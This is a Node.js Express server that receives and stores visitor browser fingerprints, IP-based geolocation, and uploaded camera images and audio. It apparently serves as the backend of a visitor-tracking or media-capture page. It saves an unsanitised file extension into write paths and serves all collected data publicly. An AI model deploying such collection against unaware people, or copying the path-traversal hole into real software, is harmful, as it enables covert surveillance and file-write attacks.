const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const geoip = require('geoip-lite');

// Initialize directories
const dataDirs = [
  path.join('data', 'media', 'images'),
  path.join('data', 'media', 'audio'),
  path.join('data', 'fingerprints')
];

// Create directories if they don't exist
function initializeDirectories() {
  dataDirs.forEach(dir => {
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
      console.log(`Created directory: ${dir}`);
    }
  });
  
  if (!fs.existsSync('data/errors.log')) {
    fs.writeFileSync('data/errors.log', '');
  }
}

initializeDirectories();

// Get real client IP
function getClientIp(req) {
  return req.ip || req.connection.remoteAddress;
}

app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));
app.use('/data', express.static(path.join(__dirname, 'data')));


// Enable CORS for mobile testing
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  next();
});

// Fingerprint endpoint
app.post('/collect-fingerprint', (req, res) => {
  try {
    const fingerprint = {
      timestamp: new Date().toISOString(),
      ip: getClientIp(req),
      geo: geoip.lookup(getClientIp(req)),
      userAgent: req.headers['user-agent'],
      ...req.body
    };

    const filename = `fingerprint-${Date.now()}.json`;
    fs.writeFileSync(
      path.join(__dirname, 'data', 'fingerprints', filename),
      JSON.stringify(fingerprint, null, 2)
    );
    
    res.sendStatus(200);
  } catch (err) {
    console.error('Fingerprint error:', err);
    res.status(500).send('Error saving fingerprint');
  }
});

// Media endpoint
app.post('/collect-media', (req, res) => {
  try {
    const { type, data, extension } = req.body;
    
    if (!['image', 'audio'].includes(type)) {
      return res.status(400).send('Invalid media type');
    }

    const filename = `${type}-${Date.now()}.${extension}`;
    const folder = type === 'audio' ? 'audio' : 'images';
    const filePath = path.join(__dirname, 'data', 'media', folder, filename);


    const base64Data = data.split(',')[1] || data;
    fs.writeFileSync(filePath, base64Data, 'base64');
    
    res.sendStatus(200);
  } catch (err) {
    console.error('Media save error:', err);
    res.status(500).send('Error saving media');
  }
});

// Error logging endpoint
app.post('/log-error', (req, res) => {
  try {
    console.error('Client error:', req.body.error);
    res.sendStatus(200);
  } catch (err) {
    console.error('Error logging failed:', err);
    res.status(500).send('Error logging error');
  }
});

app.listen(3000, '0.0.0.0', () => {
  console.log('Server running on http://0.0.0.0:3000');
  console.log('Access from mobile: http://<your-local-ip>:3000');
});
